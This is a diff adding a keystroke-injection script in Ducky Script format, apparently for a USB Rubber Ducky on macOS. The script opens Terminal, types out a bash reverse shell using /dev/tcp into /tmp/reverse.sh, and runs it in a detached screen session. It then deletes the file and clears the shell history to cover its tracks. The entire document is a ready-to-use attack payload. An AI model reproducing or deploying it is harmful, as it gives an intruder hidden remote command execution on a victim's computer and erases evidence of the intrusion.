@@ -1,0 +1,40 @@
+DELAY 1000
+GUI SPACE
+STRING terminal
+ENTER
+DELAY 1000
+STRING vi /tmp/reverse.sh
+ENTER
+STRING i
+STRING #!/usr/bin/env bash
+ENTER
+STRING attacker_ip=$1
+ENTER
+STRING attacker_port=$2
+ENTER
+STRING exec 5<>/dev/tcp/$attacker_ip/$attacker_port
+ENTER
+STRING cat <&5 | while read line; do $line 2>&5 >&5; done
+ESC
+STRING :wq!
+ENTER
+STRING screen
+ENTER
+DELAY 1000
+SPACE
+DELAY 1000
+STRING sh /tmp/reverse.sh 127.0.0.1 56666
+ENTER
+DELAY 1000
+CTRL A
+CTRL D
+DELAY 1000
+STRING rm /tmp/reverse.sh
+DELAY 1000
+ENTER
+STRING history -c
+DELAY 1000
+ENTER
+STRING exit
+DELAY 500
+ENTER
